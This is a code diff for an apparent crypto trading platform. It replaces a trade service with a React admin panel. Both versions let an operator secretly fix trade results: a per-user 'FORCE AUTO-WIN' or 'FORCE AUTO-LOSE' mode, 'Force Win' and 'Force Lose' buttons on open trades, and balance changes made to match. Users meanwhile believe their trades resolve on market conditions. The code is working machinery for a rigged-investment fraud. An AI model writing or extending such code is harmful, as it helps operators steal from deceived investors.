@@ -1,105 +1,222 @@
-import { supabase } from "../lib/supabase";
-import { getUserById, updateUserAsset } from "./userService";
+import { useState, useEffect } from 'react';
+import { Power, TrendingUp, TrendingDown, Loader2, CheckCircle2, XCircle, CircleDashed } from 'lucide-react';
+import { supabase } from '@/lib/supabase'; // FIXED PATH ALIAS
+import ConfirmDialog from '../../common/ConfirmDialog.jsx';
+import { useToast } from '../../common/Toast.jsx';
+import * as tradingService from '../../../services/tradingService';
+import * as tradeService from '../../../services/tradeService'; 
+import { cn } from '../../../utils/helpers';
+import Dropdown from '../../common/Dropdown.jsx';
 
-const TRADE_SELECT_WITH_PROFILE = `
-  *,
-  profiles (
-    full_name,
-    email,
-    mode
-  )
-`;
+const MODE_OPTIONS = [
+  { label: 'Neutral (Standard)', value: 'neutral' },
+  { label: '⚡ FORCE AUTO-WIN', value: 'win' },
+  { label: '💀 FORCE AUTO-LOSE', value: 'lose' },
+];
 
-async function runTradeQuery(queryFactory) {
-  let result = await queryFactory(TRADE_SELECT_WITH_PROFILE);
-  if (result.error) {
-    result = await queryFactory("*");
-  }
-  if (result.error) throw result.error;
-  return result;
-}
+export default function TradingTab({ user, onRefetch }) {
+  const [confirmOpen, setConfirmOpen] = useState(false);
+  const [loading, setLoading] = useState(false);
+  const { addToast } = useToast();
 
-export async function getTrades(params = {}) {
-  const { page = 1, limit = 20, status, userId, symbol } = params;
-  const from = (page - 1) * limit;
-  const to = from + limit - 1;
-  const { data, count } = await runTradeQuery((select) => {
-    let query = supabase.from("trade_history").select(select, { count: "exact" }).order("created_at", { ascending: false }).range(from, to);
-    if (status) query = query.eq("status", status);
-    if (userId) query = query.eq("user_id", userId);
-    if (symbol) query = query.ilike("symbol", `%${symbol}%`);
-    return query;
-  });
-  return { items: data || [], total: count || 0 };
-}
+  const [tradeMode, setTradeMode] = useState('neutral');
+  const [updatingMode, setUpdatingMode] = useState(false);
 
-export async function getTradeById(id) {
-  const { data } = await runTradeQuery((select) => supabase.from("trade_history").select(select).eq("id", id).single());
-  return data;
-}
+  const [openTrades, setOpenTrades] = useState([]);
+  const [tradesLoading, setTradesLoading] = useState(true);
+  
+  const [settlingTrade, setSettlingTrade] = useState(null);
+  const [settlingOutcome, setSettlingOutcome] = useState(null);
+  const [confirmSettleOpen, setConfirmSettleOpen] = useState(false);
+  const [settlingLoading, setSettlingLoading] = useState(false);
 
-export async function createTrade(tradePayload) {
-  const { data, error } = await supabase.from("trade_history").insert([{ ...tradePayload, status: tradePayload.status || "open" }]).select().single();
-  if (error) throw error;
-  return data;
-}
+  const enabled = Boolean(user.tradingEnabled);
 
-/* ============================================================
-   AUTO-CALCULATE SETTLEMENT (LOOKS AT 'mode' COLUMN)
-============================================================ */
-export async function settleExpiredTrades() {
-  const { data: openTrades, error } = await supabase
-    .from("trade_history")
-    .select(TRADE_SELECT_WITH_PROFILE)
-    .eq("status", "open")
-    .lt("expires_at", new Date().toISOString());
+  // 1. FETCH USER DATA & TRADES
+  useEffect(() => {
+    async function loadUserData() {
+      if (!user?.id && !user?.email) return;
+      setTradesLoading(true);
+      try {
+        let query = supabase
+          .from("trade_history")
+          .select("*")
+          .eq("status", "open");
 
-  if (error) throw error;
+        if (user.id) {
+          query = query.eq("user_id", user.id);
+        } else if (user.email) {
+          query = query.eq("user_email", user.email);
+        }
 
-  for (const trade of openTrades) {
-    let forcedOutcome = null;
-    const userMode = trade.profiles?.mode || 'neutral';
+        const { data, error } = await query;
+        if (error) throw error;
+        setOpenTrades(data || []);
 
-    if (userMode === 'win') forcedOutcome = 'win';
-    else if (userMode === 'lose') forcedOutcome = 'lose';
+        const { data: profileData, error: profileError } = await supabase
+          .from("profiles")
+          .select("mode") 
+          .eq("id", user.id)
+          .single();
+          
+        if (!profileError && profileData) {
+          setTradeMode(profileData.mode || 'neutral');
+        }
+      } catch (err) {
+        console.error("Failed to load data", err);
+      } finally {
+        setTradesLoading(false);
+      }
+    }
+    loadUserData();
+  }, [user?.id, user?.email]);
 
-    if (forcedOutcome) {
-      await adminForceSettleTrade(trade.id, forcedOutcome);
+  // 2. HANDLE AUTO WIN / LOSE MODE CHANGE
+  async function handleModeChange(newMode) {
+    if (newMode === tradeMode) return;
+    setUpdatingMode(true);
+    try {
+      const { error } = await supabase
+        .from("profiles")
+        .update({ mode: newMode })
+        .eq("id", user.id);
+
+      if (error) throw error;
+      
+      setTradeMode(newMode);
+      addToast(`Trade mode updated to ${newMode.toUpperCase()}`, 'success');
+      onRefetch?.();
+    } catch (err) {
+      addToast(err.message || 'Failed to update trade mode', 'error');
+      setTradeMode(tradeMode); 
+    } finally {
+      setUpdatingMode(false);
     }
   }
-}
 
-/* ============================================================
-   ADMIN FORCE WIN / LOSE LOGIC
-============================================================ */
-export async function adminForceSettleTrade(tradeId, outcome) {
-  const trade = await getTradeById(tradeId);
-  if (!trade) throw new Error("Trade not found.");
-  if (trade.status === "closed") throw new Error("Trade is already closed.");
-
-  let profitAmount = 0;
-  let userBalanceUpdate = 0;
-  const payoutMultiplier = 1.8;
-
-  if (outcome === 'win') {
-    profitAmount = (trade.amount * payoutMultiplier) - trade.amount;
-    userBalanceUpdate = trade.amount + profitAmount;
-  } else if (outcome === 'lose') {
-    profitAmount = -trade.amount;
-    userBalanceUpdate = 0;
-  } else {
-    throw new Error("Invalid outcome type.");
+  // 3. TOGGLE TRADING STATUS
+  async function handleToggle() {
+    setLoading(true);
+    try {
+      await tradingService.toggleUserTrading(user.id, !enabled);
+      addToast(`Trading ${!enabled ? 'enabled' : 'disabled'}`, 'success');
+      setConfirmOpen(false);
+      onRefetch?.();
+    } catch (err) {
+      addToast(err.message || 'Failed to update trading status', 'error');
+    } finally {
+      setLoading(false);
+    }
   }
 
-  await updateUserAsset(trade.user_id, 'USDT', userBalanceUpdate, `admin_${outcome}`, `Auto-${outcome.toUpperCase()} via Admin Mode`);
+  // 4. FORCE SETTLE INDIVIDUAL TRADE
+  function openSettleConfirmation(trade, outcome) {
+    setSettlingTrade(trade);
+    setSettlingOutcome(outcome);
+    setConfirmSettleOpen(true);
+  }
 
-  const { data, error } = await supabase
-    .from("trade_history")
-    .update({ status: "closed", outcome: outcome, profit_amount: profitAmount, closed_at: new Date().toISOString() })
-    .eq("id", tradeId)
-    .select()
-    .single();
+  async function handleForceSettle() {
+    if (!settlingTrade || !settlingOutcome) return;
+    setSettlingLoading(true);
+    try {
+      await tradeService.adminForceSettleTrade(settlingTrade.id, settlingOutcome);
+      addToast(`Trade forced to ${settlingOutcome.toUpperCase()}!`, 'success');
+      setOpenTrades((prev) => prev.filter(t => t.id !== settlingTrade.id));
+      setConfirmSettleOpen(false);
+    } catch (err) {
+      addToast(err.message || 'Failed to settle trade', 'error');
+    } finally {
+      setSettlingLoading(false);
+      setSettlingTrade(null);
+      setSettlingOutcome(null);
+    }
+  }
 
-  if (error) throw error;
-  return data;
+  return (
+    <div className="space-y-6">
+      <div className="card p-5">
+        <h3 className="text-sm font-semibold text-slate-200 mb-5">Trading Status</h3>
+        <div className="flex items-center justify-between p-4 rounded-xl bg-slate-800/40">
+          <div className="flex items-center gap-3">
+            <div className={cn('w-10 h-10 rounded-xl flex items-center justify-center', enabled ? 'bg-emerald-500/10' : 'bg-red-500/10')}>
+              <Power className={cn('w-5 h-5', enabled ? 'text-emerald-400' : 'text-red-400')} />
+            </div>
+            <div>
+              <p className="text-sm font-semibold text-slate-200">Trading is currently {enabled ? 'ON' : 'OFF'}</p>
+              <p className="text-xs text-slate-500">
+                {enabled ? 'This user can open and manage trades.' : 'This user is blocked from opening new trades.'}
+              </p>
+            </div>
+          </div>
+          <button onClick={() => setConfirmOpen(true)} className={cn('px-4 py-2 rounded-xl text-sm font-medium transition-colors', enabled ? 'bg-red-500/10 text-red-400 hover:bg-red-500/20' : 'bg-emerald-500/10 text-emerald-400 hover:bg-emerald-500/20')}>
+            {enabled ? 'Disable Trading' : 'Enable Trading'}
+          </button>
+        </div>
+      </div>
+
+      <div className="card p-5">
+        <h3 className="text-sm font-semibold text-slate-200 mb-5">Trade Outcome Override</h3>
+        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 p-4 rounded-xl bg-slate-800/40">
+          <div className="flex items-center gap-3">
+            <div className={cn('w-10 h-10 rounded-xl flex items-center justify-center', tradeMode === 'win' ? 'bg-emerald-500/20' : tradeMode === 'lose' ? 'bg-red-500/20' : 'bg-slate-600/20')}>
+              {tradeMode === 'win' && <CheckCircle2 className="w-5 h-5 text-emerald-400" />}
+              {tradeMode === 'lose' && <XCircle className="w-5 h-5 text-red-400" />}
+              {tradeMode === 'neutral' && <CircleDashed className="w-5 h-5 text-slate-400" />}
+            </div>
+            <div>
+              <p className="text-sm font-semibold text-slate-200">
+                {tradeMode === 'win' && 'Auto-Win Mode (ACTIVE)'}
+                {tradeMode === 'lose' && 'Auto-Lose Mode (ACTIVE)'}
+                {tradeMode === 'neutral' && 'Neutral Mode'}
+              </p>
+              <p className="text-xs text-slate-500">
+                {tradeMode === 'win' && '⚠️ This user will WIN every single trade they place.'}
+                {tradeMode === 'lose' && '⚠️ This user will LOSE every single trade they place.'}
+                {tradeMode === 'neutral' && 'Trades resolve based on market conditions.'}
+              </p>
+            </div>
+          </div>
+          <div className="min-w-[160px]">
+            <Dropdown options={MODE_OPTIONS} value={tradeMode} onChange={handleModeChange} disabled={updatingMode} />
+          </div>
+        </div>
+      </div>
+
+      <div className="card p-5">
+        <h3 className="text-sm font-semibold text-slate-200 mb-5">Active Trades <span className="text-xs font-normal text-slate-500 ml-2">({openTrades.length})</span></h3>
+        {tradesLoading ? (
+          <div className="flex justify-center py-8"><Loader2 className="w-6 h-6 text-blue-400 animate-spin" /></div>
+        ) : openTrades.length === 0 ? (
+          <div className="text-center py-8 text-slate-500 text-sm bg-slate-800/20 rounded-xl border border-slate-700/50">This user has no active open trades.</div>
+        ) : (
+          <div className="space-y-3">
+            {openTrades.map((trade) => {
+              const isLong = trade.direction === 'Long';
+              return (
+                <div key={trade.id} className="flex items-center justify-between p-3 rounded-xl bg-slate-800/40 border border-slate-700/50 hover:border-slate-600/50 transition-colors">
+                  <div className="flex items-center gap-4">
+                    <div className={cn('w-8 h-8 rounded-lg flex items-center justify-center', isLong ? 'bg-emerald-500/10' : 'bg-rose-500/10')}>
+                      {isLong ? <TrendingUp className="w-4 h-4 text-emerald-400" /> : <TrendingDown className="w-4 h-4 text-rose-400" />}
+                    </div>
+                    <div>
+                      <p className="text-sm font-semibold text-white">{trade.symbol}</p>
+                      <p className="text-xs text-slate-400">{trade.direction} • ${Number(trade.amount).toLocaleString()} • Entry: ${Number(trade.entry_price).toLocaleString()}</p>
+                    </div>
+                  </div>
+                  <div className="flex items-center gap-2">
+                    <button onClick={() => openSettleConfirmation(trade, 'win')} className="px-3 py-1.5 rounded-lg bg-emerald-500/20 text-emerald-400 text-xs font-bold hover:bg-emerald-500 hover:text-white transition-colors">🟢 Force Win</button>
+                    <button onClick={() => openSettleConfirmation(trade, 'lose')} className="px-3 py-1.5 rounded-lg bg-rose-500/20 text-rose-400 text-xs font-bold hover:bg-rose-500 hover:text-white transition-colors">🔴 Force Lose</button>
+                  </div>
+                </div>
+              );
+            })}
+          </div>
+        )}
+      </div>
+
+      <ConfirmDialog open={confirmOpen} onClose={() => setConfirmOpen(false)} onConfirm={handleToggle} loading={loading} title={`${enabled ? 'Disable' : 'Enable'} trading for this user?`} message={enabled ? 'They will be unable to open new trades until re-enabled.' : 'They will regain the ability to open new trades.'} confirmLabel={enabled ? 'Disable' : 'Enable'} variant={enabled ? 'danger' : 'primary'} />
+      <ConfirmDialog open={confirmSettleOpen} onClose={() => { setConfirmSettleOpen(false); setSettlingTrade(null); setSettlingOutcome(null); }} onConfirm={handleForceSettle} loading={settlingLoading} title={`Force ${settlingOutcome === 'win' ? 'WIN' : 'LOSE'} this trade?`} message={`This will immediately settle the ${settlingTrade?.symbol || ''} trade.`} confirmLabel={`Force ${settlingOutcome === 'win' ? 'Win' : 'Lose'}`} variant={settlingOutcome === 'win' ? 'primary' : 'danger'} />
+    </div>
+  );
 }
